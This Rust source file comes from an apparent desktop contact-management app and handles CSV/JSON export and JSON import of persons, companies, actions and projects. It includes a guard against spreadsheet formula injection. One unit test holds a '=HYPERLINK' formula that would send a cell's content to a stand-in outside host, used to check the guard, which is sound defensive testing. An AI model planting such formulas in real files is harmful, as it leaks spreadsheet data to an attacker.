use std::collections::HashMap;

use rusqlite::{params, OptionalExtension};
use tauri::State;

use crate::commands::{
    action::load_all_actions,
    company::load_all_companies,
    notes::load_all_notes,
    person::load_all_persons,
    project::load_all_projects,
    tags::{load_all_company_tag_ids, load_all_person_tag_ids, load_all_tags},
};
use crate::db::lock_db;
use crate::error::AppResult;
use crate::models::{FullDump, DUMP_VERSION};
use crate::AppState;

// ----------------------------------------------------------------------------
// Which entity we are exporting to CSV
// ----------------------------------------------------------------------------
#[derive(serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CsvEntity {
    Persons,
    Companies,
    Actions,
    Projects,
}

#[tauri::command(async)]
pub fn export_csv(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    entity: CsvEntity,
) -> AppResult<Option<String>> {
    let file_name = match entity {
        CsvEntity::Persons => "persons.csv",
        CsvEntity::Companies => "companies.csv",
        CsvEntity::Actions => "actions.csv",
        CsvEntity::Projects => "projects.csv",
    };
    let Some(path) = crate::dialogs::save_file(&app, file_name, ("CSV", &["csv"])) else {
        return Ok(None);
    };
    let conn = lock_db(&state)?;
    write_csv(&conn, entity, std::fs::File::create(&path)?)?;
    Ok(Some(path.to_string_lossy().to_string()))
}

/// Write every record of `entity` as CSV.
pub fn write_csv<W: std::io::Write>(
    conn: &rusqlite::Connection,
    entity: CsvEntity,
    out: W,
) -> AppResult<()> {
    let mut wtr = csv::Writer::from_writer(out);

    match entity {
        CsvEntity::Persons => {
            write_row(
                &mut wtr,
                [
                    "id",
                    "firstName",
                    "lastName",
                    "department",
                    "role",
                    "mobilePhone",
                    "professionalEmail",
                    "otherEmails",
                    "additionalInformation",
                    "circleOfRelation",
                    "currentCompanyId",
                    "primarySourceId",
                    "directManagerId",
                    "createdAt",
                    "updatedAt",
                ],
            )?;
            for p in load_all_persons(conn)? {
                write_row(
                    &mut wtr,
                    [
                        p.id,
                        p.first_name,
                        p.last_name,
                        p.department.unwrap_or_default(),
                        p.role.unwrap_or_default(),
                        p.mobile_phone.unwrap_or_default(),
                        p.professional_email.unwrap_or_default(),
                        p.other_emails.join("; "),
                        p.additional_information.unwrap_or_default(),
                        p.circle_of_relation
                            .map(|v| v.to_string())
                            .unwrap_or_default(),
                        p.current_company_id.unwrap_or_default(),
                        p.primary_source_id.unwrap_or_default(),
                        p.direct_manager_id.unwrap_or_default(),
                        p.created_at,
                        p.updated_at,
                    ],
                )?;
            }
        }
        CsvEntity::Companies => {
            write_row(
                &mut wtr,
                [
                    "id",
                    "name",
                    "website",
                    "sector",
                    "size",
                    "numberOfEmployees",
                    "description",
                    "priority",
                    "parentCompanyId",
                    "createdAt",
                    "updatedAt",
                ],
            )?;
            for c in load_all_companies(conn)? {
                write_row(
                    &mut wtr,
                    [
                        c.id,
                        c.name,
                        c.website.unwrap_or_default(),
                        c.sector.unwrap_or_default(),
                        c.size.unwrap_or_default(),
                        c.number_of_employees
                            .map(|v| v.to_string())
                            .unwrap_or_default(),
                        c.description.unwrap_or_default(),
                        c.priority.map(|v| v.to_string()).unwrap_or_default(),
                        c.parent_company_id.unwrap_or_default(),
                        c.created_at,
                        c.updated_at,
                    ],
                )?;
            }
        }
        CsvEntity::Actions => {
            write_row(
                &mut wtr,
                [
                    "id",
                    "title",
                    "status",
                    "preparation",
                    "conclusion",
                    "scheduledDate",
                    "completedDate",
                    "discussionType",
                    "toPersonIds",
                    "createdAt",
                    "updatedAt",
                ],
            )?;
            for a in load_all_actions(conn)? {
                write_row(
                    &mut wtr,
                    [
                        a.id,
                        a.title,
                        a.status,
                        a.preparation.unwrap_or_default(),
                        a.conclusion.unwrap_or_default(),
                        a.scheduled_date,
                        a.completed_date.unwrap_or_default(),
                        a.discussion_type.unwrap_or_default(),
                        a.to_person_ids.join(";"),
                        a.created_at,
                        a.updated_at,
                    ],
                )?;
            }
        }
        CsvEntity::Projects => {
            write_row(
                &mut wtr,
                [
                    "id",
                    "name",
                    "description",
                    "status",
                    "companyIds",
                    "createdAt",
                    "updatedAt",
                ],
            )?;
            for p in load_all_projects(conn)? {
                write_row(
                    &mut wtr,
                    [
                        p.id,
                        p.name,
                        p.description.unwrap_or_default(),
                        p.status,
                        p.company_ids.join(";"),
                        p.created_at,
                        p.updated_at,
                    ],
                )?;
            }
        }
    }

    wtr.flush()?;
    Ok(())
}

/// A spreadsheet opening the CSV runs cells starting with `=` or `@` as
/// formulas, and that text may come from an imported file. A leading `'` keeps
/// them as text. `+` and `-` are left alone: phone numbers start with `+`.
fn neutralise_formula(cell: String) -> String {
    if cell.starts_with('=') || cell.starts_with('@') {
        format!("'{cell}")
    } else {
        cell
    }
}

fn write_row<W: std::io::Write, S: Into<String>>(
    wtr: &mut csv::Writer<W>,
    fields: impl IntoIterator<Item = S>,
) -> AppResult<()> {
    wtr.write_record(fields.into_iter().map(|f| neutralise_formula(f.into())))?;
    Ok(())
}

// ----------------------------------------------------------------------------
// JSON : full dump
// ----------------------------------------------------------------------------

pub fn collect_dump(conn: &rusqlite::Connection) -> AppResult<FullDump> {
    Ok(FullDump {
        persons: load_all_persons(conn)?,
        companies: load_all_companies(conn)?,
        actions: load_all_actions(conn)?,
        projects: load_all_projects(conn)?,
        tags: load_all_tags(conn)?,
        person_tag_ids: load_all_person_tag_ids(conn)?,
        company_tag_ids: load_all_company_tag_ids(conn)?,
        notes: load_all_notes(conn)?,
        version: DUMP_VERSION,
    })
}

#[tauri::command(async)]
pub fn export_json(app: tauri::AppHandle, state: State<'_, AppState>) -> AppResult<Option<String>> {
    let Some(path) = crate::dialogs::save_file(&app, "sapphire-dump.json", ("JSON", &["json"]))
    else {
        return Ok(None);
    };
    let dump = collect_dump(&*lock_db(&state)?)?;
    std::fs::write(&path, serde_json::to_vec_pretty(&dump)?)?;
    Ok(Some(path.to_string_lossy().to_string()))
}

#[tauri::command(async)]
/// Returns false when the user cancels the file dialog.
pub fn import_json(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    replace: bool,
) -> AppResult<bool> {
    let Some(path) = crate::dialogs::open_file(&app, Some(("JSON", &["json"]))) else {
        return Ok(false);
    };
    let raw = std::fs::read(&path)?;
    let dump: FullDump = serde_json::from_slice(&raw)?;
    import_dump(&mut *lock_db(&state)?, &dump, replace)?;
    Ok(true)
}

/// Write a dump into the database in one transaction.
///
/// Rows are upserted (`ON CONFLICT DO UPDATE`), never `INSERT OR REPLACE`: REPLACE
/// deletes the existing row first, which fires every `ON DELETE CASCADE` and wipes
/// the tags and links of records that are only being updated.
pub fn import_dump(
    conn: &mut rusqlite::Connection,
    dump: &FullDump,
    replace: bool,
) -> AppResult<()> {
    let has_tags_and_notes = dump.version >= 2;
    let tx = conn.transaction()?;
    // Records may reference ones that appear later in the file (a person's source,
    // a parent company); check foreign keys once, at commit.
    tx.execute_batch("PRAGMA defer_foreign_keys = ON;")?;

    if replace {
        tx.execute_batch(
            "DELETE FROM action_to_persons;
             DELETE FROM project_companies;
             DELETE FROM person_secondary_sources;
             DELETE FROM person_tags;
             DELETE FROM company_tags;
             DELETE FROM notes;
             DELETE FROM tags;
             DELETE FROM actions;
             DELETE FROM projects;
             DELETE FROM persons;
             DELETE FROM companies;",
        )?;
    }

    for c in &dump.companies {
        tx.execute(
            "INSERT INTO companies
             (id, name, website, sector, size, number_of_employees,
              description, priority, parent_company_id, created_at, updated_at)
             VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11)
             ON CONFLICT(id) DO UPDATE SET
              name = excluded.name, website = excluded.website, sector = excluded.sector,
              size = excluded.size, number_of_employees = excluded.number_of_employees,
              description = excluded.description, priority = excluded.priority,
              parent_company_id = excluded.parent_company_id,
              created_at = excluded.created_at, updated_at = excluded.updated_at",
            params![
                c.id,
                c.name,
                c.website,
                c.sector,
                c.size,
                c.number_of_employees,
                c.description,
                c.priority,
                c.parent_company_id,
                c.created_at,
                c.updated_at,
            ],
        )?;
    }

    for p in &dump.persons {
        let other_emails_json = serde_json::to_string(&p.other_emails)?;
        tx.execute(
            "INSERT INTO persons
             (id, first_name, last_name, department, role, mobile_phone,
              professional_email, other_emails, additional_information,
              circle_of_relation, birthday, current_company_id, primary_source_id,
              direct_manager_id, created_at, updated_at)
             VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15,?16)
             ON CONFLICT(id) DO UPDATE SET
              first_name = excluded.first_name, last_name = excluded.last_name,
              department = excluded.department, role = excluded.role,
              mobile_phone = excluded.mobile_phone,
              professional_email = excluded.professional_email,
              other_emails = excluded.other_emails,
              additional_information = excluded.additional_information,
              circle_of_relation = excluded.circle_of_relation, birthday = excluded.birthday,
              current_company_id = excluded.current_company_id,
              primary_source_id = excluded.primary_source_id,
              direct_manager_id = excluded.direct_manager_id,
              created_at = excluded.created_at, updated_at = excluded.updated_at",
            params![
                p.id,
                p.first_name,
                p.last_name,
                p.department,
                p.role,
                p.mobile_phone,
                p.professional_email,
                other_emails_json,
                p.additional_information,
                p.circle_of_relation,
                p.birthday,
                p.current_company_id,
                p.primary_source_id,
                p.direct_manager_id,
                p.created_at,
                p.updated_at,
            ],
        )?;
        tx.execute(
            "DELETE FROM person_secondary_sources WHERE person_id = ?1",
            [&p.id],
        )?;
        for sid in &p.secondary_source_ids {
            tx.execute(
                "INSERT OR IGNORE INTO person_secondary_sources (person_id, source_id) VALUES (?1, ?2)",
                params![&p.id, sid],
            )?;
        }
    }

    for pr in &dump.projects {
        tx.execute(
            "INSERT INTO projects (id, name, description, status, created_at, updated_at)
             VALUES (?1,?2,?3,?4,?5,?6)
             ON CONFLICT(id) DO UPDATE SET
              name = excluded.name, description = excluded.description,
              status = excluded.status, created_at = excluded.created_at,
              updated_at = excluded.updated_at",
            params![
                pr.id,
                pr.name,
                pr.description,
                pr.status,
                pr.created_at,
                pr.updated_at
            ],
        )?;
        tx.execute(
            "DELETE FROM project_companies WHERE project_id = ?1",
            [&pr.id],
        )?;
        for cid in &pr.company_ids {
            tx.execute(
                "INSERT OR IGNORE INTO project_companies (project_id, company_id) VALUES (?1, ?2)",
                params![&pr.id, cid],
            )?;
        }
    }

    for a in &dump.actions {
        tx.execute(
            "INSERT INTO actions
             (id, title, status, preparation, conclusion,
              scheduled_date, completed_date, discussion_type,
              created_at, updated_at)
             VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10)
             ON CONFLICT(id) DO UPDATE SET
              title = excluded.title, status = excluded.status,
              preparation = excluded.preparation, conclusion = excluded.conclusion,
              scheduled_date = excluded.scheduled_date,
              completed_date = excluded.completed_date,
              discussion_type = excluded.discussion_type,
              created_at = excluded.created_at, updated_at = excluded.updated_at",
            params![
                a.id,
                a.title,
                a.status,
                a.preparation,
                a.conclusion,
                a.scheduled_date,
                a.completed_date,
                a.discussion_type,
                a.created_at,
                a.updated_at,
            ],
        )?;
        tx.execute(
            "DELETE FROM action_to_persons WHERE action_id = ?1",
            [&a.id],
        )?;
        for pid in &a.to_person_ids {
            tx.execute(
                "INSERT OR IGNORE INTO action_to_persons (action_id, person_id) VALUES (?1, ?2)",
                params![&a.id, pid],
            )?;
        }
    }

    if has_tags_and_notes {
        import_tags_and_notes(&tx, dump)?;
    }

    tx.commit()?;
    Ok(())
}

fn import_tags_and_notes(tx: &rusqlite::Transaction, dump: &FullDump) -> AppResult<()> {
    // Tag names are unique. A dump tag whose name already exists under another id
    // is merged into the existing tag rather than failing the import.
    let mut tag_id_map: HashMap<&str, String> = HashMap::new();
    for tag in &dump.tags {
        let existing_by_name: Option<String> = tx
            .query_row(
                "SELECT id FROM tags WHERE name = ?1 AND id <> ?2",
                params![tag.name, tag.id],
                |r| r.get(0),
            )
            .optional()?;
        let local_id = match existing_by_name {
            Some(id) => id,
            None => {
                tx.execute(
                    "INSERT INTO tags (id, name, color, created_at) VALUES (?1, ?2, ?3, ?4)
                     ON CONFLICT(id) DO UPDATE SET name = excluded.name, color = excluded.color",
                    params![tag.id, tag.name, tag.color, tag.created_at],
                )?;
                tag.id.clone()
            }
        };
        tag_id_map.insert(tag.id.as_str(), local_id);
    }
    let local_tag = |id: &str| {
        tag_id_map
            .get(id)
            .cloned()
            .unwrap_or_else(|| id.to_string())
    };

    // The dump lists every tag of every record it contains (no entry = no tags),
    // so each record's tag set is replaced, not merged.
    for p in &dump.persons {
        tx.execute("DELETE FROM person_tags WHERE person_id = ?1", [&p.id])?;
        for tag_id in dump.person_tag_ids.get(&p.id).into_iter().flatten() {
            tx.execute(
                "INSERT OR IGNORE INTO person_tags (person_id, tag_id) VALUES (?1, ?2)",
                params![p.id, local_tag(tag_id)],
            )?;
        }
    }
    for c in &dump.companies {
        tx.execute("DELETE FROM company_tags WHERE company_id = ?1", [&c.id])?;
        for tag_id in dump.company_tag_ids.get(&c.id).into_iter().flatten() {
            tx.execute(
                "INSERT OR IGNORE INTO company_tags (company_id, tag_id) VALUES (?1, ?2)",
                params![c.id, local_tag(tag_id)],
            )?;
        }
    }

    for n in &dump.notes {
        // One note per entity: replace whatever note the entity already has.
        tx.execute(
            "DELETE FROM notes WHERE entity_type = ?1 AND entity_id = ?2 AND id <> ?3",
            params![n.entity_type, n.entity_id, n.id],
        )?;
        tx.execute(
            "INSERT INTO notes (id, entity_type, entity_id, content, created_at, updated_at)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6)
             ON CONFLICT(id) DO UPDATE SET
              entity_type = excluded.entity_type, entity_id = excluded.entity_id,
              content = excluded.content, updated_at = excluded.updated_at",
            params![
                n.id,
                n.entity_type,
                n.entity_id,
                n.content,
                n.created_at,
                n.updated_at
            ],
        )?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{CompanyInput, NoteInput, PersonInput, TagInput};
    use crate::test_util::memory_db;

    #[test]
    fn csv_export_keeps_formula_like_cells_as_text() {
        let mut conn = memory_db();
        crate::commands::company::insert_company(
            &mut conn,
            CompanyInput {
                name: "=HYPERLINK(\"http://x/?\"&A2)".into(),
                website: Some("@SUM(1,1)".into()),
                sector: Some("+33 1 23 45 67 89".into()),
                ..Default::default()
            },
        )
        .unwrap();

        let mut out = Vec::new();
        write_csv(&conn, CsvEntity::Companies, &mut out).unwrap();
        let csv = String::from_utf8(out).unwrap();

        assert!(csv.contains("'=HYPERLINK"), "{csv}");
        assert!(csv.contains("'@SUM(1,1)"), "{csv}");
        // Phone numbers and other text starting with + are left as they are.
        assert!(csv.contains(",+33 1 23 45 67 89"), "{csv}");
    }

    fn person_tag_ids(conn: &rusqlite::Connection, person_id: &str) -> Vec<String> {
        let mut stmt = conn
            .prepare("SELECT tag_id FROM person_tags WHERE person_id = ?1")
            .unwrap();
        stmt.query_map([person_id], |r| r.get(0))
            .unwrap()
            .map(Result::unwrap)
            .collect()
    }

    #[test]
    fn merge_import_of_own_export_keeps_tags_birthday_and_notes() {
        let mut conn = memory_db();
        let company = crate::commands::company::insert_company(
            &mut conn,
            CompanyInput {
                name: "Acme".into(),
                ..Default::default()
            },
        )
        .unwrap();
        let person = crate::commands::person::insert_person(
            &mut conn,
            PersonInput {
                first_name: "Ada".into(),
                last_name: "Lovelace".into(),
                birthday: Some("1815-12-10".into()),
                current_company_id: Some(company.id.clone()),
                ..Default::default()
            },
        )
        .unwrap();
        let tag = crate::commands::tags::insert_tag(
            &conn,
            TagInput {
                name: "VIP".into(),
                color: None,
            },
        )
        .unwrap();
        crate::commands::tags::replace_person_tags(
            &mut conn,
            &person.id,
            std::slice::from_ref(&tag.id),
        )
        .unwrap();
        crate::commands::tags::replace_company_tags(
            &mut conn,
            &company.id,
            std::slice::from_ref(&tag.id),
        )
        .unwrap();
        crate::commands::notes::upsert_note_row(
            &conn,
            NoteInput {
                entity_type: "person".into(),
                entity_id: person.id.clone(),
                content: "<p>met at the conference</p>".into(),
            },
        )
        .unwrap();

        let dump = collect_dump(&conn).unwrap();
        import_dump(&mut conn, &dump, false).unwrap();

        assert_eq!(person_tag_ids(&conn, &person.id), vec![tag.id.clone()]);
        let company_tags: i64 = conn
            .query_row("SELECT COUNT(*) FROM company_tags", [], |r| r.get(0))
            .unwrap();
        assert_eq!(company_tags, 1);
        let reloaded = crate::commands::person::load_person(&conn, &person.id)
            .unwrap()
            .unwrap();
        assert_eq!(reloaded.birthday.as_deref(), Some("1815-12-10"));
        assert_eq!(
            reloaded.current_company_id.as_deref(),
            Some(company.id.as_str())
        );
    }

    #[test]
    fn replace_import_restores_tags_and_notes_from_the_dump() {
        let mut conn = memory_db();
        let person = crate::commands::person::insert_person(
            &mut conn,
            PersonInput {
                first_name: "Ada".into(),
                last_name: "Lovelace".into(),
                ..Default::default()
            },
        )
        .unwrap();
        let tag = crate::commands::tags::insert_tag(
            &conn,
            TagInput {
                name: "VIP".into(),
                color: Some("#f00".into()),
            },
        )
        .unwrap();
        crate::commands::tags::replace_person_tags(
            &mut conn,
            &person.id,
            std::slice::from_ref(&tag.id),
        )
        .unwrap();
        crate::commands::notes::upsert_note_row(
            &conn,
            NoteInput {
                entity_type: "person".into(),
                entity_id: person.id.clone(),
                content: "<p>hello</p>".into(),
            },
        )
        .unwrap();
        let dump = collect_dump(&conn).unwrap();

        // Import the dump into a fresh database, as a user moving machines would.
        let mut fresh = memory_db();
        import_dump(&mut fresh, &dump, true).unwrap();

        assert_eq!(person_tag_ids(&fresh, &person.id), vec![tag.id]);
        let note = crate::commands::notes::load_note(&fresh, "person", &person.id)
            .unwrap()
            .unwrap();
        assert_eq!(note.content, "<p>hello</p>");
    }

    fn person(first: &str, last: &str) -> PersonInput {
        PersonInput {
            first_name: first.into(),
            last_name: last.into(),
            ..Default::default()
        }
    }

    #[test]
    fn version_1_dump_leaves_existing_tags_alone() {
        let mut conn = memory_db();
        let ada =
            crate::commands::person::insert_person(&mut conn, person("Ada", "Lovelace")).unwrap();
        let tag = crate::commands::tags::insert_tag(
            &conn,
            TagInput {
                name: "VIP".into(),
                color: None,
            },
        )
        .unwrap();
        crate::commands::tags::replace_person_tags(
            &mut conn,
            &ada.id,
            std::slice::from_ref(&tag.id),
        )
        .unwrap();

        let mut old_format = collect_dump(&conn).unwrap();
        old_format.version = 1;
        old_format.tags.clear();
        old_format.person_tag_ids.clear();
        import_dump(&mut conn, &old_format, false).unwrap();

        assert_eq!(person_tag_ids(&conn, &ada.id), vec![tag.id]);
    }

    #[test]
    fn records_may_reference_records_later_in_the_file() {
        let mut conn = memory_db();
        let zed = crate::commands::person::insert_person(&mut conn, person("Zoé", "Zed")).unwrap();
        let adams = crate::commands::person::insert_person(
            &mut conn,
            PersonInput {
                primary_source_id: Some(zed.id.clone()),
                ..person("Émilie", "Adams")
            },
        )
        .unwrap();
        let dump = collect_dump(&conn).unwrap();
        // Sorted by last name, so Adams comes before the person she references.
        assert_eq!(dump.persons[0].id, adams.id);

        let mut fresh = memory_db();
        import_dump(&mut fresh, &dump, true).unwrap();
        let reloaded = crate::commands::person::load_person(&fresh, &adams.id)
            .unwrap()
            .unwrap();
        assert_eq!(reloaded.primary_source_id, Some(zed.id));
    }

    #[test]
    fn dump_tag_with_an_existing_name_is_merged_into_it() {
        let mut source = memory_db();
        let ada =
            crate::commands::person::insert_person(&mut source, person("Ada", "Lovelace")).unwrap();
        let theirs = crate::commands::tags::insert_tag(
            &source,
            TagInput {
                name: "VIP".into(),
                color: None,
            },
        )
        .unwrap();
        crate::commands::tags::replace_person_tags(&mut source, &ada.id, &[theirs.id]).unwrap();
        let dump = collect_dump(&source).unwrap();

        let mut target = memory_db();
        let ours = crate::commands::tags::insert_tag(
            &target,
            TagInput {
                name: "VIP".into(),
                color: None,
            },
        )
        .unwrap();
        import_dump(&mut target, &dump, false).unwrap();

        assert_eq!(person_tag_ids(&target, &ada.id), vec![ours.id]);
    }
}
